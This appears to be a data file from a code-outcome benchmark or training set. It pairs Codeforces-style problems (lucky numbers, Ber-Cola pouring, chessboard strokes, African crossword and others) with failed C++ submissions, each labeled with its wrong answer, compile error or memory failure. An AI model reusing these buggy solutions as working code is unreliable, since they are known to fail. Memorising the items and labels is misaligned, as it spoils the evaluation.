{"difficulty":1000,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"639b8b8d0dc42df46b139f0aeb3a7a0a","submission_id":"217208201","tags":["brute+force","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\r\nusing namespace std;\r\n#define ll long long\r\n#define ld long double\r\n#define endl \"\\n\"\r\n#define FOCUS ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0);\r\nusing namespace std;\r\nbool comp(string s,string h){\r\n\tif(s.size()!=h.size())return s.size()<h.size();\r\n\telse return s<h;\r\n}\r\nint main()\r\n{\r\n    \/\/ freopen(\"jenga.in\",\"r\",stdin);\r\n\r\n    FOCUS\r\n    string s;\r\n    cin>>s;\r\n    int x=0,c=0;\r\n    for(int i=0;i<s.size();i++){\r\n    \tif(s[i]=='4')x++;\r\n    \telse if(s[i]=='7')c++;\r\n    }\r\n    if(!x&&!c)cout<<-1;\r\n    else if(x>c)cout<<4;\r\n    else cout<<7;\r\n    return 0;\r\n\r\n\r\n}\r\n","description":"Petya loves lucky numbers. Everybody knows that lucky numbers are positive integers whose decimal representation contains only the lucky digits 4 and 7. For example, numbers 47, 744, 4 are lucky and 5, 17, 467 are not.One day Petya was delivered a string s, containing only digits. He needs to find a string that represents a lucky number without leading zeroes, is not empty, is contained in s as a substring the maximum number of times.Among all the strings for which the three conditions given above are fulfilled, Petya only needs the lexicographically minimum one. Find this string for Petya.","input_from":"standard input","output_to":"standard output","input_spec":"The single line contains a non-empty string s whose length can range from 1 to 50, inclusive. The string only contains digits. The string can contain leading zeroes.","output_spec":"In the only line print the answer to Petya's problem. If the sought string does not exist, print \"-1\" (without quotes).","notes":"NoteThe lexicographical comparison of strings is performed by the &lt; operator in the modern programming languages. String x is lexicographically less than string y either if x is a prefix of y, or exists such i (1\u2009\u2264\u2009i\u2009\u2264\u2009min(|x|,\u2009|y|)), that xi\u2009&lt;\u2009yi and for any j (1\u2009\u2264\u2009j\u2009&lt;\u2009i) xj\u2009=\u2009yj. Here |a| denotes the length of string a.In the first sample three conditions are fulfilled for strings \"4\", \"7\" and \"47\". The lexicographically minimum one is \"4\".In the second sample s has no substrings which are lucky numbers.In the third sample the three conditions are only fulfilled for string \"7\".","sample_inputs":["047","16","472747"],"sample_outputs":["4","-1","7"]}
{"difficulty":1100,"lang":"GNU C++0x","lang_cluster":"c++","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_103","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\n#include <cmath>\n#include <vector> \n#include <cstdio>\nusing namespace std;\n\nint main(void)\n{\n    int n;\n    double b;\n    cin >> n >> b;\n    vector<double> v(n);\n    double res = 0, m = 0;\n    for (int i = 0; i != n; ++i)\n    {\n        cin >> v[i];\n        res += v[i];\n    }\n    if (res \/ n > b)\n    {\n        cout << -1;\n        return 0;\n    }\n    else\n        res += b;\n\n    res \/= n;\n\n    for (int i = 0; i != n; ++i)\n        printf(\"%.6f\\n\", res - v[i]);\n\n    return 0;\n}","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
{"difficulty":1300,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"6cfd3b0a403212ec68bac1667bce9ef1","submission_id":"re_6","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\nusing namespace std;\nconst int mod = 1000000007;\n#define mem(m,v) memset(m,v,sizeof(m))\n#define pb push_back\n#define mp make_pair\n#define si(n) scanf(\"%d\",&n)\n#define all(x) (x.begin() ,  x.end() )\n#define sz(x) x.size();\ntemplate<class t> inline void checkmax(t &a,t &b)\n{if(b>a)a = b;}\ntemplate<class t> inline void checkmin(t &a,t &b)\n{if(b<a)a = b;}\n#define inf (int)1e9\n#define eps LD(1e-9)\n#define dinf LD(1e50)\n\ntypedef long long ll;\ntypedef vector<int> vi;\ntypedef vector<string> vs;\ntypedef vector<vector<int> > vvi;\ntypedef pair<int,int> pii;\ntypedef double ld;\ntypedef vector<pii> vpii;\nstring s[1005];\nint a[1005];\nmap <int ,int> cnt;\nmap<int,int> :: iterator it;\nint main()\n{\n    int n;\n    cin>>n;\n    for(int i=0;i<n;i++)\n        cin>>s[i]>>a[i];\n    int x=0;\n    int ans = 0;\n    \n    for(int i=0;i<n;i++)\n    {\n        if(s[i][0] == '+')\n            cnt[a[i]]++;\n        else\n            cnt[a[i]]--;\n        if(cnt[a[i]] > 0)\n        {\n            x++;\n            ans = max(ans,x);\n        }\n        else if(cnt[a[i]] == 0)\n        {\n            x--;\n            ans = max(ans,x);\n        }\n        else \n        {\n            ans++;\n        }\n    }\n    cout<<ans;\n    return 0;\n}\n","description":"Berland National Library has recently been built in the capital of Berland. In addition, in the library you can take any of the collected works of Berland leaders, the library has a reading room.Today was the pilot launch of an automated reading room visitors' accounting system! The scanner of the system is installed at the entrance to the reading room. It records the events of the form \"reader entered room\", \"reader left room\". Every reader is assigned a registration number during the registration procedure at the library \u2014 it's a unique integer from 1 to 106. Thus, the system logs events of two forms:  \"+ ri\" \u2014 the reader with registration number ri entered the room;  \"- ri\" \u2014 the reader with registration number ri left the room. The first launch of the system was a success, it functioned for some period of time, and, at the time of its launch and at the time of its shutdown, the reading room may already have visitors.Significant funds of the budget of Berland have been spent on the design and installation of the system. Therefore, some of the citizens of the capital now demand to explain the need for this system and the benefits that its implementation will bring. Now, the developers of the system need to urgently come up with reasons for its existence.Help the system developers to find the minimum possible capacity of the reading room (in visitors) using the log of the system available to you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of records in the system log. Next follow n events from the system journal in the order in which the were made. Each event was written on a single line and looks as \"+ ri\" or \"- ri\", where ri is an integer from 1 to 106, the registration number of the visitor (that is, distinct visitors always have distinct registration numbers). It is guaranteed that the log is not contradictory, that is, for every visitor the types of any of his two consecutive events are distinct. Before starting the system, and after stopping the room may possibly contain visitors.","output_spec":"Print a single integer \u2014 the minimum possible capacity of the reading room.","notes":"NoteIn the first sample test, the system log will ensure that at some point in the reading room were visitors with registration numbers 1, 1200 and 12001. More people were not in the room at the same time based on the log. Therefore, the answer to the test is 3.","sample_inputs":["6\n+ 12001\n- 12001\n- 1\n- 1200\n+ 1\n+ 7","2\n- 1\n- 2","2\n+ 1\n- 1"],"sample_outputs":["3","2","1"]}
{"difficulty":1000,"lang":"GNU C++","lang_cluster":"c++","src_uid":"6e0dafeaf85e92f959c388c72e158f68","submission_id":"re_195","tags":["constructive algorithms","*special"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\nusing namespace std;\nconst int MAXN = 110;\nint mtr[MAXN][MAXN];\nint main() {\n    int N, A, B;\n    cin >> N >> A >> B;\n    int disp = A * B - N;\n    if (disp < 0) {\n        cout << \"-1\\n\";\n        return 0;\n    }\n    int x_ = 1, y_ = 1, imp = 1, p = 2, cnt = 1;\n    int NN = N;\n    while (N) {\n       \/\/ cout << \"imp \" << y_ << \" \" << x_ << \" \" << mtr[y_ - 1][x_] << '\\n';  \n        if (mtr[y_ - 1][x_] == 0) {\n            mtr[y_][x_] = min(imp, p);\n            if (imp < p) imp += 2;\n            else p += 2;\n            N--;\n        } else if (mtr[y_ - 1][x_]  % 2) {\n            if (p <= NN) { \n                mtr[y_][x_] = p;\n                p += 2;\n                N--;\n            } else mtr[y_][x_] = 0;\n        } else {\n            if (imp <= NN) { \n                mtr[y_][x_] = imp;\n                imp += 2;\n                N--;\n            } else mtr[y_][x_] = 0;\n        }\n        x_++;\n        x_ %= (B + 1);\n        if (!x_) x_ = 1;\n        if (x_ == 1) y_++;\n    }\n    int mats = 0;\n    for (int i = 1; i <= A; ++i) \n        for (int j = 1; j <= B; ++j) mats = max(mats, mtr[i][j]);\n    if (NN != mats) {\n        cout << \"-1\\n\";\n        return 0;\n    }\n    for (int i = 1; i <= A; ++i) {\n        for (int j = 1; j <= B; ++j) cout << mtr[i][j];\n        cout << '\\n';\n    }\n    return 0;\n}","description":"There are n parliamentarians in Berland. They are numbered with integers from 1 to n. It happened that all parliamentarians with odd indices are Democrats and all parliamentarians with even indices are Republicans.New parliament assembly hall is a rectangle consisting of a\u2009\u00d7\u2009b chairs\u00a0\u2014 a rows of b chairs each. Two chairs are considered neighbouring if they share as side. For example, chair number 5 in row number 2 is neighbouring to chairs number 4 and 6 in this row and chairs with number 5 in rows 1 and 3. Thus, chairs have four neighbours in general, except for the chairs on the border of the hallWe know that if two parliamentarians from one political party (that is two Democrats or two Republicans) seat nearby they spent all time discussing internal party issues.Write the program that given the number of parliamentarians and the sizes of the hall determine if there is a way to find a seat for any parliamentarian, such that no two members of the same party share neighbouring seats.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains three integers n, a and b (1\u2009\u2264\u2009n\u2009\u2264\u200910\u2009000, 1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009100)\u00a0\u2014 the number of parliamentarians, the number of rows in the assembly hall and the number of seats in each row, respectively.","output_spec":"If there is no way to assigns seats to parliamentarians in a proper way print -1. Otherwise print the solution in a lines, each containing b integers. The j-th integer of the i-th line should be equal to the index of parliamentarian occupying this seat, or 0 if this seat should remain empty. If there are multiple possible solution, you may print any of them.","notes":"NoteIn the first sample there are many other possible solutions. For example, 3 20 1and 2 13 0The following assignment 3 21 0is incorrect, because parliamentarians 1 and 3 are both from Democrats party but will occupy neighbouring seats.","sample_inputs":["3 2 2","8 4 3","10 2 2"],"sample_outputs":["0 3\n1 2","7 8 3\n0 1 4\n6 0 5\n0 2 0","-1"]}
{"difficulty":1100,"lang":"GNU C++","lang_cluster":"c++","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_265","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\nusing namespace std;\nint main(){\n\tint a;\n\tcin>>a;\n\tif(a<=1)cout<<\"Wrong Answer on test 1\"<<endl;\n\tfor(int i=1;i<=a;i++){\n\t\tchar c;\n\t\tcin>>c;\n\t\tint q=(i%3==0);\n\t\tif(a%3==1){\n\t\t\tif(i-a==1){\n\t\t\t\tq=0;\n\t\t\t}\n\t\t\tif(i-a==2){\n\t\t\t\tq=1;\n\t\t\t}\n\t\t}\n\t\tif(i==a)q=0;\n\t\tcout<<c;\n\t\tif(q)cout<<\"-\";\n\t}\n}","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"MS C++","lang_cluster":"c++","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_613","tags":["implementation","brute force"],"exec_outcome":"COMPILATION_ERROR","source_code":"#include <iostream>\n#include <vector>\n#include <math.h>\n#include <algorithm>\nusing namespace std;\n\nvoid main()\n{\n    int n;scanf(\"%d\",&n);\n    int M=1;\n    int Bros=1;\n    for(int q=0;q<n-1;q++)\n    {\n        M=M%n;\n        if(M==0) M=1;\n        M+=Bros;\n        Bros++;\n        M=M%n;\n        if(M==0) M=1;\n        printf(\"%d \",M);\n    }\n}","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1000,"lang":"GNU C++0x","lang_cluster":"c++","src_uid":"88e6651e1b0481d711e89c8071be1edf","submission_id":"re_166","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<stdio.h>\nint main()\n{\n    int a, x, y;\n    scanf(\"%d\",&a);\n    int i;\n    for(i=1;i<=3;i++)\n    {\n        scanf(\"%d%d\",&x,&y);\n        if(a==x) a = y;\n        else if(a==y) a = x;\n    }\n    printf(\"%d\\n\",a);\n    return 0;\n} ","description":"Today the \u00abZ\u00bb city residents enjoy a shell game competition. The residents are gathered on the main square to watch the breath-taking performance. The performer puts 3 non-transparent cups upside down in a row. Then he openly puts a small ball under one of the cups and starts to shuffle the cups around very quickly so that on the whole he makes exactly 3 shuffles. After that the spectators have exactly one attempt to guess in which cup they think the ball is and if the answer is correct they get a prize. Maybe you can try to find the ball too?","input_from":"input.txt","output_to":"output.txt","input_spec":"The first input line contains an integer from 1 to 3 \u2014 index of the cup which covers the ball before the shuffles. The following three lines describe the shuffles. Each description of a shuffle contains two distinct integers from 1 to 3 \u2014 indexes of the cups which the performer shuffled this time. The cups are numbered from left to right and are renumbered after each shuffle from left to right again. In other words, the cup on the left always has index 1, the one in the middle \u2014 index 2 and the one on the right \u2014 index 3.","output_spec":"In the first line output an integer from 1 to 3 \u2014 index of the cup which will have the ball after all the shuffles. ","notes":null,"sample_inputs":["1\n1 2\n2 1\n2 1","1\n2 1\n3 1\n1 3"],"sample_outputs":["2","2"]}
{"difficulty":1100,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"8b6ae2190413b23f47e2958a7d4e7bc0","submission_id":"218460430","tags":["brute+force","constructive+algorithms"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <iostream>\nusing namespace std;\n#define fri(a, b) for (int i = a; i < b; i++)\nint main()\n{\n    ios::sync_with_stdio(false);\n    cin.tie(0);\n    int count = 0;\n    char s[8][8];\n    fri(0, 8)\n    {\n        for (int j = 0; j < 8; j++)\n        {\n            cin >> s[i][j];\n        }\n    }\n    fri(0, 8)\n    {\n        if (s[i][i] == 'B')\n        {\n            if (s[i + 1][i] == 'B')\n                count++;\n            if (s[i][i + 1] == 'B')\n                count++;\n        }\n    }\n    cout << count << endl;\n    return 0;\n}\n\n\t\t        \t    \t\t \t\t\t\t\t\t \t\t   \t","description":"A famous Berland's painter Kalevitch likes to shock the public. One of his last obsessions is chess. For more than a thousand years people have been playing this old game on uninteresting, monotonous boards. Kalevitch decided to put an end to this tradition and to introduce a new attitude to chessboards.As before, the chessboard is a square-checkered board with the squares arranged in a 8\u2009\u00d7\u20098 grid, each square is painted black or white. Kalevitch suggests that chessboards should be painted in the following manner: there should be chosen a horizontal or a vertical line of 8 squares (i.e. a row or a column), and painted black. Initially the whole chessboard is white, and it can be painted in the above described way one or more times. It is allowed to paint a square many times, but after the first time it does not change its colour any more and remains black. Kalevitch paints chessboards neatly, and it is impossible to judge by an individual square if it was painted with a vertical or a horizontal stroke.Kalevitch hopes that such chessboards will gain popularity, and he will be commissioned to paint chessboards, which will help him ensure a comfortable old age. The clients will inform him what chessboard they want to have, and the painter will paint a white chessboard meeting the client's requirements.It goes without saying that in such business one should economize on everything \u2014 for each commission he wants to know the minimum amount of strokes that he has to paint to fulfill the client's needs. You are asked to help Kalevitch with this task.","input_from":"standard input","output_to":"standard output","input_spec":"The input file contains 8 lines, each of the lines contains 8 characters. The given matrix describes the client's requirements, W character stands for a white square, and B character \u2014 for a square painted black. It is guaranteed that client's requirments can be fulfilled with a sequence of allowed strokes (vertical\/column or horizontal\/row).","output_spec":"Output the only number \u2014 the minimum amount of rows and columns that Kalevitch has to paint on the white chessboard to meet the client's requirements.","notes":null,"sample_inputs":["WWWBWWBW\nBBBBBBBB\nWWWBWWBW\nWWWBWWBW\nWWWBWWBW\nWWWBWWBW\nWWWBWWBW\nWWWBWWBW","WWWWWWWW\nBBBBBBBB\nWWWWWWWW\nWWWWWWWW\nWWWWWWWW\nWWWWWWWW\nWWWWWWWW\nWWWWWWWW"],"sample_outputs":["3","1"]}
{"difficulty":1200,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"94a38067fc8dd8619fa6e5873ca60220","submission_id":"re_559","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\nusing namespace std;\nint n,N[109];\nint main(int argc,char**argv)\n{\n    scanf(\"%d\",&n);\n    for(int i=0;i<n;i++)\n        scanf(\"%d\",&N[i]);\n    for(int k=0;k<n;k++)\n    {\n        for(int i=k+1;i<n;i++)\n        {\n            for(int j=k+1;j<n;j++)\n            {\n                if(N[k]+N[i]==N[j])\n                {\n                    printf(\"%d %d %d\",j+1,i+1,k+1);\n                    return 0;\n                }\n            }\n        }\n    }\n\n    printf(\"-1\");\n    return 0;\n}\n","description":"Professor Vasechkin is studying evolution of worms. Recently he put forward hypotheses that all worms evolve by division. There are n forms of worms. Worms of these forms have lengths a1, a2, ..., an. To prove his theory, professor needs to find 3 different forms that the length of the first form is equal to sum of lengths of the other two forms. Help him to do this.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (3\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of worm's forms. The second line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u20091000) \u2014 lengths of worms of each form.","output_spec":"Output 3 distinct integers i j k (1\u2009\u2264\u2009i,\u2009j,\u2009k\u2009\u2264\u2009n) \u2014 such indexes of worm's forms that ai\u2009=\u2009aj\u2009+\u2009ak. If there is no such triple, output -1. If there are several solutions, output any of them. It possible that aj\u2009=\u2009ak.","notes":null,"sample_inputs":["5\n1 2 3 5 7","5\n1 8 1 5 1"],"sample_outputs":["3 2 1","-1"]}
{"difficulty":1100,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"9c90974a0bb860a5e180760042fd5045","submission_id":"re_257","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\nusing namespace std;\nint main(){\n    int r,c;\n    string s;\n    cin>>r>>c;\n    vector<string>v;\n    for(int i=0;i<r;i++){\n        cin>>s;\n        v.push_back(s);\n    }\n    for(int i=0;i<r;i++){\n        for(int j=0;j<c;j++){\n            bool flag = true;\n            for(int h=0;h<r;h++){\n                if(v[h][j]==v[i][j]&&h!=i){\n                    flag  = false;\n                }\n            }\n            for(int h=0;h<c;h++){\n                if(v[j][h]==v[i][j]&&h!=j){\n                    flag  = false;\n                }\n            }\n            if(flag == true){\n                cout<<v[i][j];\n            }\n        }\n    }\n    return 0;\n}\n","description":"An African crossword is a rectangular table n\u2009\u00d7\u2009m in size. Each cell of the table contains exactly one letter. This table (it is also referred to as grid) contains some encrypted word that needs to be decoded.To solve the crossword you should cross out all repeated letters in rows and columns. In other words, a letter should only be crossed out if and only if the corresponding column or row contains at least one more letter that is exactly the same. Besides, all such letters are crossed out simultaneously.When all repeated letters have been crossed out, we should write the remaining letters in a string. The letters that occupy a higher position follow before the letters that occupy a lower position. If the letters are located in one row, then the letter to the left goes first. The resulting word is the answer to the problem.You are suggested to solve an African crossword and print the word encrypted there.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n,\u2009m\u2009\u2264\u2009100). Next n lines contain m lowercase Latin letters each. That is the crossword grid.","output_spec":"Print the encrypted word on a single line. It is guaranteed that the answer consists of at least one letter.","notes":null,"sample_inputs":["3 3\ncba\nbcd\ncbc","5 5\nfcofd\nooedo\nafaoa\nrdcdf\neofsf"],"sample_outputs":["abcd","codeforces"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"a35a27754c9c095c6f1b2d4adccbfe93","submission_id":"216477714","tags":["constructive+algorithms","implementation"],"exec_outcome":"MEMORY_LIMIT_EXCEEDED","source_code":"#include<bits\/stdc++.h>\r\nusing namespace std;\r\nvoid solve(){\r\n    int n,a,b;\r\n    cin>>n>>a>>b;\r\n    int n1;\r\n    map<int,int>mp;\r\n    for(int i=0;i<a;i++){\r\n        cin>>n1;\r\n        mp[n1] = 1;\r\n    }\r\n    for(int i=0;i<b;i++){\r\n        cin>>n1;\r\n        mp[n1] = 2;\r\n    }\r\n    for (auto i = mp.begin(); i != mp.end(); i++)\r\n        cout<<i->second<<\" \";\r\n    cout<<endl;\r\n}\r\nint main()\r\n{\r\n    solve();\r\n    return 1;\r\n}\r\n","description":"Pasha has two hamsters: Arthur and Alexander. Pasha put n apples in front of them. Pasha knows which apples Arthur likes. Similarly, Pasha knows which apples Alexander likes. Pasha doesn't want any conflict between the hamsters (as they may like the same apple), so he decided to distribute the apples between the hamsters on his own. He is going to give some apples to Arthur and some apples to Alexander. It doesn't matter how many apples each hamster gets but it is important that each hamster gets only the apples he likes. It is possible that somebody doesn't get any apples.Help Pasha distribute all the apples between the hamsters. Note that Pasha wants to distribute all the apples, not just some of them.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integers n, a, b (1\u2009\u2264\u2009n\u2009\u2264\u2009100;\u00a01\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n) \u2014 the number of apples Pasha has, the number of apples Arthur likes and the number of apples Alexander likes, correspondingly. The next line contains a distinct integers \u2014 the numbers of the apples Arthur likes. The next line contains b distinct integers \u2014 the numbers of the apples Alexander likes. Assume that the apples are numbered from 1 to n. The input is such that the answer exists.","output_spec":"Print n characters, each of them equals either 1 or 2. If the i-h character equals 1, then the i-th apple should be given to Arthur, otherwise it should be given to Alexander. If there are multiple correct answers, you are allowed to print any of them.","notes":null,"sample_inputs":["4 2 3\n1 2\n2 3 4","5 5 2\n3 4 1 2 5\n2 3"],"sample_outputs":["1 1 2 2","1 1 1 1 1"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"a6e9405bc3d4847fe962446bc1c457b4","submission_id":"213762220","tags":["implementation","math"],"exec_outcome":"WRONG_ANSWER","source_code":"\/*\r\nKazi Irfanul Islam Payel\r\n_AIUB_CSE_\r\n*\/\r\n#include<bits\/stdc++.h>\r\nusing namespace std;\r\n#define ll long long\r\n#define faster ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0);\r\n#define endl '\\n'\r\n#define pb push_back\r\n\r\nint main()\r\n{\r\n    faster; \r\n    \/\/ int t;\r\n    \/\/ cin >> t;\r\n    \/\/ cin.ignore();\r\n    \/\/ for(int testcase=1; testcase<=t; testcase++)\r\n    \/\/ {\r\n         \r\n\r\n    \/\/ } \r\n\r\n    int x1,y1,x2,y2;\r\n    cin>>x1>>y1>>x2>>y2;\r\n\r\n    int cnt = 0;\r\n    int x = abs(x2-x1);\r\n    int y = abs(y2-y1);\r\n\r\n    if(x==y)\r\n    {\r\n        cnt = x;\r\n    }\r\n    else {\r\n         x1 = abs(x2-x1);\r\n         y1 = abs(x2-x1);\r\n\r\n        if(y1!=y2)\r\n        {\r\n            cnt = x1+abs(y2-x1);\r\n        }\r\n    }\r\n    cout<<cnt<<endl;\r\n\r\n\r\n\r\n\r\n\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n","description":"Professor GukiZ makes a new robot. The robot are in the point with coordinates (x1,\u2009y1) and should go to the point (x2,\u2009y2). In a single step the robot can change any of its coordinates (maybe both of them) by one (decrease or increase). So the robot can move in one of the 8 directions. Find the minimal number of steps the robot should make to get the finish position.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers x1,\u2009y1 (\u2009-\u2009109\u2009\u2264\u2009x1,\u2009y1\u2009\u2264\u2009109) \u2014 the start position of the robot. The second line contains two integers x2,\u2009y2 (\u2009-\u2009109\u2009\u2264\u2009x2,\u2009y2\u2009\u2264\u2009109) \u2014 the finish position of the robot.","output_spec":"Print the only integer d \u2014 the minimal number of steps to get the finish position.","notes":"NoteIn the first example robot should increase both of its coordinates by one four times, so it will be in position (4,\u20094). After that robot should simply increase its y coordinate and get the finish position.In the second example robot should simultaneously increase x coordinate and decrease y coordinate by one three times.","sample_inputs":["0 0\n4 5","3 4\n6 1"],"sample_outputs":["5","3"]}
{"difficulty":800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"b432dfa66bae2b542342f0b42c0a2598","submission_id":"218902525","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<bits\/stdc++.h>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n\tstring s,s1 = \"\";\r\n\tint lower = 0, upper = 0;\r\n\tcin >> s;\r\n\tfor (int i = 0; i < s.size(); i++) {\r\n\t\tif (isupper(s[i])) upper++;\r\n\t\telse lower++;\r\n\t}\r\n\tif (lower >= upper) {\r\n\t\tfor (int i = 0; i < s.size(); i++) {\r\n\t\t\ts1 += (char)tolower(s[i]);\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tfor (int i = 0; i < s.size(); i++) {\r\n\t\t\ts1 += (char)tolower(s[i]);\r\n\t\t}\r\n\t}\r\n\tcout << s1;\r\n\r\n}","description":"Vasya is very upset that many people on the Net mix uppercase and lowercase letters in one word. That's why he decided to invent an extension for his favorite browser that would change the letters' register in every word so that it either only consisted of lowercase letters or, vice versa, only of uppercase ones. At that as little as possible letters should be changed in the word. For example, the word HoUse must be replaced with house, and the word ViP \u2014 with VIP. If a word contains an equal number of uppercase and lowercase letters, you should replace all the letters with lowercase ones. For example, maTRIx should be replaced by matrix. Your task is to use the given method on one given word.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a word s \u2014 it consists of uppercase and lowercase Latin letters and possesses the length from 1 to 100.","output_spec":"Print the corrected word s. If the given word s has strictly more uppercase letters, make the word written in the uppercase register, otherwise - in the lowercase one.","notes":null,"sample_inputs":["HoUse","ViP","maTRIx"],"sample_outputs":["house","VIP","matrix"]}
{"difficulty":1000,"lang":"GNU C++14","lang_cluster":"c++","src_uid":"bd5912fe2c5c37658f28f6b159b39645","submission_id":"re_54","tags":["implementation","greedy","strings"],"exec_outcome":"COMPILATION_ERROR","source_code":"main.cpp","description":"Calculate the minimum number of characters you need to change in the string s, so that it contains at least k different letters, or print that it is impossible.String s consists only of lowercase Latin letters, and it is allowed to change characters only to lowercase Latin letters too.","input_from":"standard input","output_to":"standard output","input_spec":"First line of input contains string s, consisting only of lowercase Latin letters (1\u2009\u2264\u2009|s|\u2009\u2264\u20091000, |s| denotes the length of s). Second line of input contains integer k (1\u2009\u2264\u2009k\u2009\u2264\u200926).","output_spec":"Print single line with a minimum number of necessary changes, or the word \u00abimpossible\u00bb (without quotes) if it is impossible.","notes":"NoteIn the first test case string contains 6 different letters, so we don't need to change anything.In the second test case string contains 4 different letters: {'a',\u2009'h',\u2009'o',\u2009'y'}. To get 5 different letters it is necessary to change one occurrence of 'o' to some letter, which doesn't occur in the string, for example, {'b'}.In the third test case, it is impossible to make 7 different letters because the length of the string is 6.","sample_inputs":["yandex\n6","yahoo\n5","google\n7"],"sample_outputs":["0","1","impossible"]}
